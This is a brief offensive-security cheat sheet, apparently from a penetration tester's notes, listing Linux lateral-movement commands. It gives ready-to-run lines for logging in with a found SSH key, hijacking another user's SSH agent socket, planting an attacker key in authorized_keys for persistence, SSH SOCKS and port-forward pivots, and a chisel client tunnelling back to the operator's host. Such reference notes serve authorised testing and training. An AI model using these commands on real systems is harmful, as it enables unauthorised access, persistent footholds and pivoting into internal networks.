# Linux Lateral Movement

**Tags:** #lateral-movement #linux #ssh #privesc
**Full Playbook:** [[06-Lateral-Movement/INDEX]]

---

## Quick Reference

```bash
# SSH with found key
ssh -i id_rsa user@$TARGET

# SSH agent hijack
export SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.XXXXX
ssh user@$TARGET

# Add our key
echo "ssh-rsa AAAA...PUBKEY" >> ~/.ssh/authorized_keys

# Pivot via SSH
ssh -N -D 1080 user@$TARGET           # SOCKS proxy
ssh -N -L 5432:internal:5432 user@$TARGET  # Local forward

# Chisel
./chisel client $LHOST:8080 R:socks   # SOCKS via chisel
```

See full guide: [[06-Lateral-Movement/INDEX]]
